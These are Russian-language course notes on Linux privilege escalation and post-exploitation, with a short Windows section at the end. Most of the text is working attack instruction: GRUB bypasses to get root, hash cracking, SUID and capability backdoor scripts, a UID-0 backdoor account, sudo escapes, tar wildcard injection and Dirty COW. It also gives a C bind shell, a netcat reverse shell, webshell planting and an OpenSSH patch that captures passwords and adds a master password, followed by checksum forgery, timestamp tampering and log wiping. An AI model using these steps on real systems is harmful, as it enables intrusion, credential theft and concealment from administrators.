Занятие 1
Повышение привелегий - использование уязвимостей операционной системы и прикладного ПО для повышения полномочий в атакуемой системе
Кольца привелегий

Использование физического доступа:
Самое простое - вытащить из компа диск и подключить его к другому компьютеру

Использование ошибок администрирования:
Админ плохо сконфигурировал свой сервер и дал лишние привилегии пользователю
(Стандартные конфигурации по умолчанию достаточно безопасны)

Использование сервисов, которые обновлялись или не обновлялись

Атаки на ядро


Если пользователь получил права рута, то проще погасить систему полностью, ибо есть риск того, что атакующий мог хорошо спрятаться 

Список учетных записей лежит в /etc/passwd
User-ID:Password(раньше тут был хеш пароля):UID:GID:User_Info:/HomeDir:/bin/bash(Shell)
adduser/deluser
addgroup/delgroup
usermod
id
who
whoami
passwd

/etc/shadow - файл с именами пользователей и паролями
Login_Name:Encrypted_Password:days_since_last_change:

/etc/login.defs - файл содержащий сведения об алгоритме 

Перебор Хэшей
1) Хэши берем из файла /etc/shadow 
2) Определение типа хеша 
cat /etc/login.defs | grep ENCRYPT_METHOD
github.com/psypanda/hashID
onlinehashcrack.com/hash-iden
3) Готовимсловарь паролей
crackststion.net
wiki.skullsecurity.org/Passwords
github.com/danielmiessler/SecLists
4) Запуск утилит
./hashcat-cli64.bin -m $HASH_TYPE -a 0 crack.hash dict.txt
john --wordlist=dict.txt --rules shadow



Атака на grub
1) Перед загрузкой системы нажать на стрелку, что бы система не загрузилась сама
Если меню выбора нет, то зажимаем ESC во время загузки
2) Нажать "c" что бы войти в режим консоли
Теперь мы получили доступ ко всем дискам в режиме чтения!
3) ls	Получаем список дисков
4) ls <диск>
Ищем раздел с файловой системой "Filesystem type ext*"
5) ls (hd0,msdos5)/
Нашли файловую систему

Вывести /etc/shadow
1) set pager=1
Необходим, что бы данные не убежали за экран
2) cat (hd0, msdos5)/etc/shadow



Запустить линукс с флешки, даже если это запрещено в BIOS
1) ls
2) set root=(hd0,msdos1)
3) linux /vmlinuz ro root=/dev/sda2
4) initrd /initrd.img
5) boot



Запустится с рутом с флешки
1) set pager=1
2) ls
3) cat (hd0,1)/etc/shadow
Читаем файл с хешами паролей
4) set root=(hd0,1)
Устанавливаем раздел
5) linux /boot/vmlinuz-3.13.0-29-generic root=/dev/sda1
Выбираем файл с ядром и параметрами ядра
6) initrd /boot/initrd.img-3.13.0.29-generic
Выбираем файл с initrd
7) boot



Сразу зайти под рутом
1) Навести на основную систему ( не advanced options) 
2) Нажать 'e'
3) Заменить "ro quite splash" на "rw init=/bin/bash"
4) CTRL + X или F10
При запуске мы сразу получим bash от рута. После перезагрузки все будет по-прежнему



Поменяем пароль от пользователя
1) cp /etc/shadow /etc/shadow.orig 	
Делаем бэкап файла
2) passwd <user>
Меняем пароль
3) mount -o remount,rw /	
На случай если не можем записывать на диск
4) echo b > /proc/sysrq-trigger		
Перезагружаемся, так как обычный ребут не работает



Добавить backdoor пользователя (очень палевно, если за системой следят)
1) $ vim /etp/passwd
2) вставляем "tech:x:0:0:root:/root:/bin/bash"
3) $ passwd -d tech
Убираем пароль с пользователя (не так надежно)
4) $ passwd tech
Или ставим свой пароль 



ESC - выйти из консольного режима
e - изменение параметра загрузки
c - консоль grub



Если в GRUB (версии 1.98-2.02) стоит пароль, его можно обойти путем 28 нажатий на Backspace
На сайте есть ссылка на то, как это работает



Initramfs - файловая система, используемая для решения проблемы курицы-яйца (загружается первой)
Это маленькая версия линукса, которая содержит все необходимое для монтирования основной файловой системы и дальнейшей загрузки
Initramfs никогда не шифруетя! 



Заходим в Initramfs (Resque Shell) с правами рута
1) Выбираем режим 'e'
2) linux /boot/... root=hahahaha ro quite ...
Меняем значение root= на несуществующее
3) CTRL + X или F10 
4) ls /dev/sd*
Смотрим доступные диски
5) mount -t ext4 /dev/sda1 /root/
Перебираем все доступные диски, пока не примонтируется. Теперь у нас есть файловая система с правами рута



Меняем пароль через Initramfs
Способ 1
1) vi /etc/passwd
Вручную меняем пароль (не самый надежный способ)
Способ 2
1) chroot /root/
Меняем корневую директорию
2) passwd <login>
Теперь можем сменить пароль с помощью passwd



LUKS - стандарт шифрования дисков, используемый по умолчанию в разных дистрибутивах Linux

Раздел с загрузчиком, initrd и ядром часто остается незащищенным при использовании LUKS
Это позволяет добавить в initrd закладку, которая сохранит введенный пароль и отправит его атакующему



Защитные меры
1) Установка пароля на BIOS/UEFI, выбор приоритета загрузки, использование механизмов SecureBoot
2) Использование шифрования дисков
3) Установка пароля на GRUB 
	$ grub-mkpasswd-pbkdf2
	Добавить в файл /etc/grub.d/00_header следующее:
		cat << EOF
		set superusers="John"
		password John grub.pbkdf2.sha512.10000.<...>
		EOF
	$ sudo update-grub



Атака на thunderCLAP - позволяет получить доступ к оперативной памяти и выкачать ключи из макбука
thunderclap.io

Можно физически заморозить оперативную память и вытащить ее. После этого плашка вставляется в комп со специальным ПО
для извлечения данных из оперативной памяти Cold-Boot

Программатор материнской платы позволяет ставить очень устойчивые бэкдоры
github.com/Cr4sh/SmmBackdoor



Выполнение команд от имени другого пользователя
su - переключение пользователя в сеансе командной оболочки
sudo - выполнение команды от имени другого пользователя
/etc/sudoers - конфигурационный файл для команды sudo
visudo - безопасное изменение конфигурационного файла
sudo -l - список разрешенных команд через sudo



Типы файлов (ls -l)
f или -	Обычный файл
d 	Директория
p 	Именованный канал (средство межпроцессной коммуникации, например pipe. С одной стороны читает, с другой пишет. В памяти не лежит)
l	Символьная ссылка (перенаправляет запросы на чтение и запись по заданному пути. Создать: ln -s <путь> <имя>)
b 	Блочное устройство (позволяет взять hex дамп данных с жесткого диска в сыром виде)
c	Символьное устройство (выдает набор данных, по которым невозможна навигация. Используестя в рандомайзерах: xxd /dev/urandom)
s	Сокет (работает как сетевой порт, но с привязкой к файлу)



В папке proc можно менять параметры оборудования, к примеру, яркость монитора и т п
ls /proc | grep brightness 

pipe - переменная, которая не хранится в памяти. Запись и чтение должны быть одновременны

ln -s /etc/passwd link2
cat link2

С помощью символьных ссылок можно повысить привелегии
если назвать ссылку именем, которым воспольуется программа 

$ xxd /dev/urandom - прикольный генератор случайных данных на экране



Низкоуровневый кейлоггер
1) $ cd /dev/input/by-id (/dev/input/by-path)
Переходим в директорию, где хранятся данные о переферии
2) $ ls
Выводим список устройств
3) $ sudo xxd <device>
Выводим на экран hex-дамп действий от устройства



Права доступа
На файл:
r(4) можно записать в файл
w(2) можно прочитать из файла
x(1) можно запустить файл
На директорию:
r(4) можно создавать, удалять, переименовывать файлы
w(2) чтение списка файлов в дириктории
x(1) прохождение через директорию



Еще один способ добавления/удаления прав
$ chmod ugo+wx	user/group/other + write/execute
$ chmod ugo-rx



Управление правами доступа
chmod	 изменение прав доступа
umask	 маска прав доступа (влияет на права новых файлов)
chown	 изменение владельца, доступна для суперпользователя
chgrp	 изменение группы владельца, пользователь может ставить только те группы, в которые он входит



Без права на чтение можно запускать бинарники, но не интерпретируемые скрипты (bash/python)

umask - вновь создаваемые файлы будут иметь права по алгоритму: 666 - umask=026 = 640

suid bit позволяет выполнять программы с правами хозяина 

Если на машине есть несколько аккаунтов, то лучше поставить на домашние папки права 750





Занятие 2
SUID bit - позволяет выполнение программы с правами хозяина файла. Это ключевой механизм повшения прав в Unix

Особенности SUID-программ в стандартнх конфигурациях Linux:
Работают с полномочиями root
Используются для вполнения безопасных привилегированнх операций, например, смены пароля ил отправки ICMP-запросов
Используются для штатной смены дентификаторов пользователя: su, udo, pkexec
Требования к коду этих программ всокие, так как ошибки ведут к нарушению безопасности всей системы
Программы учитывают идентификатор запустившего их пользователя и различные файлы конфигурации   



Закрепляемся в системе после единичного получения прав рута 
1) $ cp /bin/sh /bin/suid_sh
Создаем копию bash
2) $ chmod u+s /bin/suid_sh
Добавляем suid бит 
3) $ /bin/suid_sh -p
Запускаем оболочку. Без аргумента, система сбросит права



Поиск SUID-файлов в файловой сиистеме
$sudo find / -path /sys -prune -o -path /proc -prune -o -user root -type f -perm -4000

find <путь в котором проводится поиск> 	
-path <путь> -prune -o			исключить путь
-user <name>				имя пользователя
-type f					тип файл
-perm -4000				есть право suid



Идентификатор процекссов
Real - идентификатор пользователя, который запустил программу
Effective - идентификатор пользователя, от имени которого запущена программа
Привилегированные процессы имеют действующий идентификатор пользователя равнй 0



Работа с идентификаторами (из презентации)

#define _GNU_SOURCE
#include <unistd.h> (если не находит, то apt install build-essential)
#include <stdio.h>

void print_ids()
{
uid_t ruid, euid, suid;
getresuid(&ruid, &euid, &suid);
printf("Real: %d\nEffective: %d\nSaved: %d\n", ruid, euid, suid);
} 

int main()
{
print_ids();
puts("Dropping root privileges");
setreuid(getuid(), getuid());
print_ids();
}

Компиляция и запуск:
$ gcc uid.c -o uid; sudo chown 0:0 uid; sudo chmod +s uid;
$ ./uid

Этот пример демонстрирует работу программ, запускаемых с suid бит. 
Изначально их Real UID равен id пользователя, который запускает программу, а Effective UID равен id рута
После чего программа может как повысить Real UID до уровня рута, так и сбросить Effective до уровня пользователя



$ man getuid
$ man <функция в языке> 	мануалы  есть и в  средствах языков программирования



Скрипт для установки SUID бэкдора. Нужно запустить один раз от рута

#!/bin/bash
SRC=$(mktemp -t XXXXXXX.c)
cat << EOF >> $SRC
#include <unistd.h>
int main()
{
	setreuid(geteuid(),geteuid());
	execve("/bin/sh",0,0);
}
EOF
gcc $SRC -o /bin/backdoor
chmod u+s /bin/backdoor

Запуск скрипта
$ sudo bash script.sh
$ /bin/backdoor



Capabilities - средства для управления привилегиями, которые в традиционных unix-системах были доступн только процессам, запущенным от рута
Это более скрытный способ повышения привилегий



Скрипт для установки Capabilities-бэкдора. Запускать от рута. Невозможно найти с помощью find, но скрипт нужно добавить в автозагрузку

#!/bin/bash
SRC=$(mktemp -t XXXXXXX.c)
cat << EOF > "$SRC"
#include <unistd.h>
int main()
{
	setreuid(0,0);
	execve("/bin/sh",0,0);
}
EOF
gcc "$SRC" -o /tmp/backdoor
setcap cap_setuid+ep /tmp/backdoor
rm "$SRC"

Запуск скрипта
$ sudo bash ./script.sh
$ sudo chown user:user /tmp/backdoor
$ sudo setcap cap_setuid+ep /tmp/backdoor



Специальные атрибуты файловой системы
lsattr	показать атрибуты файла
chattr	изменение атрибутов файла
Наиболее интересные атрибуты
a	в файл можно только дозаписывать содержимое, но не изменять 
i	файл защищен от изменений (даже рут не сможет удалить)
u	при удалении файла его содержимое должно быть сохранено с возможностью дальнейшего восстановления
s	защищенное удаление файла, перед удалением все содержимое затирается "00"



$ sudo chattr +/-i file 	атрибут, который не позволяет с файлом ничего сделать (это защищает от окирпичивания при rm -Rf)
$ lsattr * 		показать атрибуты
$ sudo chattr +a file 	атрибут, позволяющий защитить файл от изменения, при этом дописывать можно (хорошо для логов)



Удаленный доступ к системе
Архитектура процессора 
Тип шелла
	Web-Shell
	Bind/reverse shell
	Non-interactive shell
	SSH (можно использовать как прокси)



Сбор информации
Дистрибутив и версия системы 
	/etc/issue
	/etc/*-release
Ядро ОС
	uname -a		важна дата компиляции (сработают эксплойты, которыые новее)
	ls -la /boot/		нужно тестировать эксплойты на идентично-сконфигурированной виртуалке перед тем как атаковать. 
Пользователи и их файлы
	/etc/passwd
	ls -la /home
	.bash_history
	.nano_history
	.mysql_history
	.ssh
	Бэкапы
Сетевое окружение
	ip neigh
	ss -tln			узнаем сервисы по портам
	netstat -tnlp
Задачи cron
	/etc/crontab
	/etc/cron.*
Работа в sudo
	sudo -l
SUID файлы
	find / user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null



Автоматизированный сбор информации об уязвимостях в системе
github.com/diego-treitos/linux-smart-enumeration	скрипт собирает инфомацию об ошибках конфигурации
github.com/rebootuser/LinEnum
github.com/luke-goddard/enumy
github.com/mostaphabahadou/postenum
github.com/carlospolop/privelege-escalation-awesome-scripts-suite

Утилиты для поиска уязвимостей (дают много ложнх срабатываний)
Lynis (lyni --pentest -режим для проведения аудтиа с теми правами, которе есть) cysofy.com/lynis
Linux exploit suggester				
Inspector
local_exploit_suggester		модуль для metasploit



После завершени работы логи терминала пишутся в ~/.bash_history
$ unset HISTFILE перед завершением работы не оставляет следов деятельности в этом файле





Заняте 3

Экплкатация ошибок администрирования


Атаки на плохо сконфигурированные программы с праваим sudo
sudo -l 		показать команды, которые можно спользовать с sudo 
gtfobins.github.io	сайт с кучей эксплойтов к программам, на которые есть права sudo


vim:
	sudo vim
	:!sh
	

nmap:	
	sudo nmap --interactive	(работает  в старх версиях)
	!sh
	
	TF=$(mktemp) echo 'os.execute("/bin/h")' > $TF sudo nmap --script=$TF


ftp:
	!/bin/sh
	

iftop:
	!
	sh
	

man:
	man man
	!/bin/bash
	

less:
	less /etc/services
	!/bin/bash
	

find:
	sudo find /etc/passwd -exec /bin/sh \; (важно  что бы find нашел только одн подходящий файл)
	

nano:
	nano 
	^R^X
	reset; sh 1>&0 2>&0
	
	nano -s /bin/sh
	/bin/sh
	^T


awk:
	sudo awk 'BEGIN {system("/in/sh")}'
	

apache2:
	sudo apache2 -f /etc/shadow
	получаем хеш рута!



Атаки на Cron
/etc/crontab - файл с конфгурацей
SHELL=/bin/sh	шелл, с помощью которого запускается скрипт
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin	Переменная окруженя PATH для поска команд

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh



crontab.guru	сайт для наглядности задач cron



Если cron обращается к файлу "importants.sh", в который мы можем записывать:
vim important.sh
	...
	/home/user/backdoor.sh
Скрипт выполнится при следующем срабатывании cron
Если спользовать в качестве backdoor.sh скрипт с прошлого занятия, то в конце должно быть: rm $SRC



Bash поддерживает использованеи метасимволов
Символ * заменяется на отсортированный в алфавитном порядке список файлов в соответствующей директории
Это позволяет использовать файлы с определенными именами для инжектирования опций в команду
$ touch -- '-la'
$ touch file
$ ls *		Выполняется словно была запущена с аргументом -la
-rw-r--r-- 1 user user 0 Jun 8 17:38 file
$ ls -- *
file -la




Атака на систему резервного копированя через tar
Если добавить в копируемую директорию следующие файлы, то мы сможем вполнить наш скрипт
$ touch ./--checkpoint=1
$ touch ./--checkpoint-action=exec=script.sh



Если cron испаользует wildcard (*), то мы можем подставить свои значения
Так-же если назвать файл, к примеру -l (арумент команд), то она выполнится, когда программа дойдет до нее

на rootme таск назвается ultra upload



Атака на PATH
можем изменить переменную PATH и добавить путь до контролируемой папки, что бы вместо настоящей программы запустился наш код
$ mkdir /tmp/bin
$ PATH=/tmp/bin/:$PATH
$ cp /bin/backdoor /tmp/bin/ 



Прочесть /etc/shadow, имея доступ только к инструменту для чтения логов
$ ln -s /etc/shadow file.log
/usr/local/bin/read_logfile 



Эксплуатация уязвимостей на примере exim
1) версия
	$ exim -bV # < 4.86.2 
2) compiled with Perl support
	+ Support for: crypteq iconv() Perl DKIM PRDR OCSP
3) contains a perl_startup configuration variable
	/etc/exim.conf
	perl_startup = do '/usr/share/exim4/exigrey.pl'



Ghidra - опенсорсный декомпилятор, который умеет представлять бинарники в читаемом виде




Занятие 4

Эусплуатация уязвимости nginx (директория с логами принадлежит www-data, а сами логи пишет рут)
$ su
# su -l www-data
$ cd /var/log/nginx
$ rm error.log
$ ln -s /home/user/stolen.log error.log    



Перед эксплуатацией необходимо изучить скрипт. Не на всех машинах есть компилятор
В таком случае есть смысл принести с собой уже скомпилированный код



Уязвимость Dirty COW
Очень мощная и работает в старых версиях почти безотказно
https://github.com/FireFart/dirtycow

Эксплуатация:
1) $ cat > dirty_cow.c
Вставляем содержимое эксплойта
2) $ gcc -pthread dirty_cow.c -o dirty -lcrypt
Компилируем скрипт
3) $ ./dirty 0000
Запускаем скрипт с аргументом в виде желаемого пароля
4) $ su 
Вводим указанный пароль и получаем рут права
5) Закрепляемся в системе (как угодно)
6) # mv /tmp/passwd.bak /etc/passwd
Восстанавливаем оригинальныый файл, что бы ничего не сломалось

Перезаписываем /etc/passwd и добавляем копию рута с хешом
Перезапись suid файла с добавлением своей полезной нагрузки



Вручную создатель пользователя с правами root и паролем "123456"
$ echo "tech:fi8RL.Us0cfSs:0:0:tech:/root:/bin/bash" >> /etc/passwd



Перехват нажатия клавиш (работает во всех окнах в рамках сессии c графическим интерфейсом)
$ xinput list
Выводим список всех устройств
$ xinput test <device name>
Перехватываем все нажатия



Ядро ОС - основная часть ОС, управляющая выполнением процессов и их доступом к ресурсам вычислительной системы:
	процессорному времени
	оперативной памяти
	устройствам ввода-вывода
	механизмам межпроцессного взаимодействия
	средства сетевого взаимодействия

Приложения обращаются к ядру
Ядро работает через драйвера с железом
Это позволяет создать гибкий интерфейс для взаимодействия с компьютером



Процесс - программа, которая находится в состоянии выполнения
В процесс входит набор ресурсов:
	открытые файлы
	сигналы, ожидающие обработки
	состояние процессора
	адресное пространство памяти
	один или несколько потоков кода
	сегмент данных программы (data section)
	внутренние данные ядра
	многое другое
Для каждого процесса в ядре находится структура данных о нем
По завершении работы программы, занятые ей ресурсы высвобождаются
Поскольку количество яжер сильно меньше количества запущенных процессов, процессы работают по очереди, в течение определенного времени



Виртуальная память - метод управления памятью. Для процесса создается иллюзия, будто ему доступна вся физическая память системы, 
а его адресное пространство изолируется от адресного пространства других процессов



Структура памяти Linux
# Kernel (пользователи не могут писать и читать)
|
# Stack (функции и аргументы программ, растет вниз)
|
# Memory Mapping (содержит динамические библиотеки, растет вниз)
|
# Heap ( динамические данные программ, растет вверх)
|
# BSS segment
# Data segment
# Text segment (ELF)
|



Ядро принимает обращения от программ и выполняет необходимые действия для работы с памятью и низкоуровневыми ресурсами компьютера

Процесс - программа, находящаяся в состоянии выполнения



Выполнение системного вызова
$ vim hello.asm
	SECTION .data
	msg db "Hello, world!",0xa
	len equ $ - msg
	SECTION .text
	global _start
	_start:
        	mov eax, 4 ; write syscall
        	mov ebx, 1 ; to stdout
        	mov ecx, msg ; Hello, world!
        	mov edx, len ; strlen
        	int 0x80 ; syscall
        	mov eax, 1 ; exit syscall
        	mov ebx, 0 ; exit code
$ nasm -f elf -o hello.o hello.asm
$ ld -m elf_i386 -o hello hello.o



Материал для глубокого понимания работы компьютера за 8 месяцев
https://docs.google.com/spreadsheets/d/1LUIblyHhuJ0fb9xYvPKoYFtxd8k4hKVHE9A1SKhVjuw/edit#gid=0 

Учим C после него учим ассемблер
https://github.com/xairy/linux-kernel-exploitation





Занятие 5

Подсказка к ДЗ1 
Создаем suid интерпретируемый скрипт
Пишем suid-программу (компилируемую), которая уже запускает скрипт
!Придумать подход, который не подвержен уязвимости подмены переменной path (абсолютный путь?)



Среда для зучения ядра Linux
Linux kernel module cheat
github.com/cirosantilli/linux-kernel-module-cheat#your-first-kernel-module-hack
Руководство по модулям ядра линукс



Инструментальные средства
Отладка:
GNU gdb
Radare2
IDA Pro (платная)
Реверс:
GNU gdb
Radare2
IDA Pro (платная)
Автоматизация:
Python + pwnlib
Pure python
C
Python + pwntools



Работа с gdb
На предоставленной виртуальной машине нужно:
1) зайти под user Qwerty123
2) $ mv .gdbinit .gdbinit.bak
3) $ gdb ./hello
Запускаем анализ бинарника
(gdb) b _start 	- поставить точку останоки на _start
(gdb) r		- запустить сессию отладки
(gdb) set disassembly-flavor intel	- что бы удобнее выводился ассемблерный код
(gdb) disassemble _start	- дизассемблируем функцию _start
(gdb) x/s 0x80490a0		- вывест строку по адресу
(gdb) si	- продолжить выполнене программы
(gdb) quit

$mv .gdbinit.txt .gdbinit
Возвращаем отключенный модуль
$ gdb ./hello
С модулем многе вещи автоматзируются  выполняются удобнее



gdb - самый стандартный отладчик на языке C под Linux
его нужно хорошо знать. Штука полезная 



godbolt.org - платформа, разбвающая код на C по системным процессам

Модуль ядра Linux - скомпилированный двоичный код, который вставляется в ядро и добавляет в него определенную функциональность,
например, поддержку определенного оборудования или сетевого протокола. Ядро Linux поддерживает динамическую загрузку модулей

Модули ядра нужно компилировать под конкретную машину



Собраем модуль ядра 
1) $ cd helloworld 
2) $ make
3) $ sudo insmod hello.ko
4) $ dmesg | tail
Показываем последне модули
5) $ sudo rmmod hello
Удаляем модуль ядра



Модуль с бэкдором (см приложене "PrEsc 6 getroot.txt")
1) $ cd getroot
2) $ make
3) $ sudo insmod getroot.c
4) $ sudo chmod 0666 /dev/ttyR0
Теперь в системе появился бэкдор
5) echo "g0tR0ot" > /dev/ttyR0
При выполнени этой программы мы получим рут права
(возможно до первой перезагрузки)



Графическая карта средств защиты ядра Linux
https://github.com/a13xp0p0v/linux-kernel-defence-map



Процесс эксплуатации уязвимостеи ядра
1) Найти уязвимость в коде ядра
2) Использовать ее для получения возможности выполнять свой код или осуществлять произвольное чтение.запись в память
3) Повысить права процесса
4) Починить поломанные в ходе предыдущих шагов структуры, что бы ядро не сломалось
5) Запустить шелл с правами суперпользователя



Получение ядра
https://snapshot.debian.org/archive/debian-security/ - репозиторий с ядрами
сами ядра хранятся в /boot/


Занятие 6

Задачи постэксплуатациии:
1) Повшение првилегий
2) Поиск и получение информаци: пароли, ключ, сведения об инфраструктуре
3) Закрепление доступа: использование программных закладок и штатнх средствдля сохранения скртого постоянного доступа к файлам
4) Сокрытие следов: изменение лог-файлов, времени доступа к ним, предотвращения обнаружения процессов, файлов  сетевх соединений, связаннх с атакой
5) Изменение системных сервисов для получения дополнительной информации и атак на пользователей системы
6) Получение доступа к локальной сети

Получение доступа к любому устройству позволяет эффективно проводить аудит всей сети



Материалов по постэксплуатации не очень много. Либо это материалы со стороны blackhat, либо инсайд информация промышленных шпионов и следователей



Инструменты постэксплуатации
Веб шелл
Reverse/bind shell
Средства аудита: linux exploit suggester, lynis
Получение постоянного доступа:
	Backdoor в OpenSSH
	PAM-backdoor
	UDF-backdoor в MySQL
Сокрытие следов:
	Модификация логов (utmp/wtmp/btmp/lastlog)
	Изменение времени доступа к фалам (ctime/atime/mtime)
	Изменение имен процессов с помощью XHide
	Сокрытие работающих процессов с помощью LD_PRELOAD или rootkit
Работа с сетью:
	Скрытый доступ к системе через Hidden Service в сети Tor
	DNS-туннель (dnscat, iodine)
	Проксирование трафика через локальную сеть: socat, ssh, rsocks



После эксплуатации уязвимости получили доступ к интерфейсу базы данных phpmyadmin
1) В ней находим таблицу с пользователями users и копируем хеш пароля $P$D7QFzKiz72CgXm7SmrdYIMNLFAudV2/ 	
2) Генерим новый хеш пароля, который мы вставим вместо старого
	echo -n 0000 | md5sum
3) Меняем пароль пользователю admin и входим под его данными на страницу администратора jooml



Extension - код на языке php, который позволяет использовать небольшие куски кода для создания визуальных эффектов



Web-shell может быть двух типов:
Готовая платформа, вставляемая на сервер (для доступа требуется только браузер, но легко детектится)
Клиентское приложение, которое заворачивает полезную нагрузку в непримечательные запросы (требуется клиент, но найти такой бэкдор сложно)



Shell платформа через php extension
1) Качаем любой extension с сайта. Распаковываем архив
2) Берем готовый шелл (Важно, в нем могут быть бэкдоры от разработчика! Быть осторожнее с этим) 
https://github.com/mIcHyAmRaNe/wso-webshell/blob/master/wso.php
3) Кладем phpshell в распакованный архив в папку plugin
4) Запаковываем все обратно
5) Заходим в Extension Manager под админом и загружаем плагин
6) Заходим по адрессу шелла и получаем доступ к серверу, шелу и проим прикольным вещам



Скрытый Shell через phpSploit (если возможно, то это всегда лучше)
1) $ git clone https://github.com/nil0x42/phpsploit
Качаем проект phpsploit
2) $ cd phpsploit && sudo pip3 install -r requirements.txt
или sudo python3 -m pip install -r requirements.txt
3) $ sudo ./phpsploit
Запускаем скрипт
4) phpsploit > backdoor
Генерируем бэкдор @eval($_SERVER['HTTP_PHPSPL01T']);
5) Вставляем бэкдор в index.php
6) phpsploit > set TARGET https://website.com/index.php
7) phpsploit > set PASSKEY VERSION
Если меняли PHPSPL01T на VERSION
8) phpsploit > exploit
Мы получили шелл!
9) phpsploit(website.com) > download file.txt
Скачать файл с сервера
10) phpsploit(website.com) > help
Узнать об остальных функциях


HTTP_PHPSPL01T - пароль (можем поменять, лучше на HTTP_VERSION)
@eval() - выглядит подозрительно. Часто это указывает на бэкдор
Что бы еще сильнее спрятаться можно менять ip адреса и user agent для каждого запроса
У такого шелла нехватает интерактивности



Bind shell
int main ()
{
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(4444);
	addr.sin_addr.s_addr = INADDR_ANY;

	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
	bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
	listen(sockfd, 0);
	
	int connfd = accept(sockfd, NULL, NULL);
	for (int i = 0; i < 3; i++)
	{
		dup2(confd, i);
	}
	
	execve("/bin/sh", NULL, NULL);
	return 0;
}



Reverse shell
nc -nvlp 11337		на сервере
nc -e /bin/sh server.online 11337	на жертве
Для выкачки файлов можно скачать метерпреттер



Для получения ssh-like шелла можно использовать скрипты на python:
$ python -c 'import pty; pty.spawn("/bin/sh")'
https://github.com/infodoc/python-pty-shells
Для автозапуска пользуемся cron



Python ssh-like shell:
1) https://raw.githubusercontent.com/infodox/python-pty-shells/master/tcp_pty_backconnect.py
Закинуть на жертву с измененным адресом и портом. Назовем shell.py
2) https://raw.githubusercontent.com/infodox/python-pty-shells/master/tcp_pty_shell_handler.py
Ставим на наш сервер 
3) $ python tcp_pty_shell_handler.py -b 0.0.0.0:<port>
Настраиваемся на прием
4) run python2.<6/7/..> shell.py
Запускаем шелл на жертве. Теперь работает табуляция, vim и прочие классные штуки!



Запуск второго ssh сервера
$ mkdir ssh
$ cd ssh
$ ssh-keygen
$ cp /etc/ssh/sshd_config config
$ vim config
$ /usr/sbin/sshd -f config



OpenSSH backdoor
# apt-get update
# apt-get install dpkg-dev
# apt-get build-dep openssh-server
# apt-get source openssh-server
# cd openssh-6.7p1
# vim auth-passwd.c
/USE_PAM
	#ifdef USE_PAM
        	if (options.use_pam)
        	{
          		// Capture password
            		FILE * backdoor_logfile;
             		backdoor_logfile = fopen("/var/tmp/.passwords.txt", "a");
                	fprintf(backdoor_logfile, "%s:%s\n", authctxt->user, password);
                	fclose(backdoor_logfile);

                	//Backdoor access
                	if (strcmp(password, "backdoor") == 0)	//в поле backdoor вставляем наш мастер-пароль для доступа
                        	return 1;
                	return (sshpam_auth_passwd(authctxt, password) && ok);
        	}
	#endif
Вставленный нами код будет сохранять все введенные пароли в лог файл, а так-же сделает backdoor пароль
# dpkg-buildpackage
# dpkg-source --commit
# dpkg-buildpackage
Ждем сборку
# find -name sshd -type f
Ищем наш измененный файл 
# strings <./debian/openssh-server-udeb/usr/sbin/sshd> | grep /var/tmp
Проверяем, что перед нами тот самый файл c бэкдором
# rm -v /usr/sbin/sshd
Удаляем оригнальный файл
# cp ./debian/openssh-server/usr/sbin/sshd /usr/sbin/
Заменяем его нашим
# ls -l /usr/sbin/sshd
Проверяем права на файл (-rwxr-xr-x 1 root root)
# service ssh restart

Готово! Теперь можно заходить по паролю backdoor
Кроме того, в /var/tmp/.passwords.txt будут лежать все введенные пароли

Теперь подменим контрольную сумму:
# dpkg --verify openssh-server
Oh-oh контрольная сумма не совпадает =( Исправим!
# md5sum /usr/sin/sshd
Вставляем сгенерированный хэш в /var/lib/dpkg/info/openssh-server.md5sums в нужное место



Обход средств контроля целостности
$ debsums -cs
$ dpkg -verify openssh-server
Хэш-суммы пакетов находятся в текстовых файлах, х можно замениить
/var/lib/dpkg/info/*.md5sums



Сокрытие времени изменения времени обращения к файлу
# stat <file>		узнать время изменения/обращени/чтения файла
access - чтение
modify - запись/изменение содержимого
change - изменение содержимого или метаданных

Изменение atime:
$ touch -a --date=" 2020-01-20" file.txt
$ touch -a --date=" 2020-01-20 23:05" file.txt
$ touch -a --date=" 2020-01-20 23:05:43.443117094 +0400" file.txt

Изменение mtime:
$ touch -m --date="2020-01-20" file.txt
$ touch -m --date=" 2020-01-20 23:05" file.txt
$ touch -m --date=" 2020-01-20 23:05:43.443117094 +0400" file.txt

Изменение ctime:
# NOW=$(date) && date -s "2030-08-15 21:30:11" && touch file.txt && date -s "$NOW"
Очень опасно, последствя непредсказуемы
Стабльно заменить ctime практически невозможно



Модфикация журналов
last	/var/log/wtmp	   		бинарный	удачные попытк входа/выхода
lastb	/var/log/btmp	   		бинарный	неудачные попытки
lastlog	/var/log/lastlog   		бинарный	последние входы в систему
who	/var/run/utmp	   		бинарный	список текущих пользователей
-	/var/log/auth.log  		текстовый	информация об авторизациях
-	/var/log/<server>/access.log	текстовый	результаты http запросов

Средства для редактирования:
sed/awk
https://github.com/Macr0phag3/LLC
unset HISTFILE



Прячем процесс из списка запущенных
https://github.com/gianlucaborello/libprocesshider

PAM-backdoor (в коде есть ошибки от скрипткиидис)
https://github.com/eurialo/pambd

Скрипт для чистки логов
https://github.com/Macr0phag3/LLC

Команда для поиска файлов с фейковой датой
find . -type f -atime -7 -printf “%AY%Am%Ad%AH%AM%AS %h/%s/%f\n” -user <username>|sort -n
нужно немного доработать





Занятие 7

В Windows есть локальные права: 
User 		 - обчный пользователь
Local Admin 	 - доступ ко всему, кроме низкого уровня
NT-Authority sys - аналог рута

Доменне права:
Delegated Admin - отвечает за свой сегмент, обчно права ограничены
Domain Admin	- самые всокие права в домене
Enterpie Admin 	- есть права ко всему в огранизации

В Windows есть локальные привилегии и есть доменные привилегии
В рамках модуля, смотрим только на локальные права



В Window компрометация одного устройства может вести к компрометации всей сети
Это происходит через доменне политики



В Windows гораздо большее значение играет человеческий фактор
90% случаев проникновения на предприятие - spear phishing



Загрузка Windows
MBR - биос.
Windows Bootloader - операционная система
Kernel - ядро
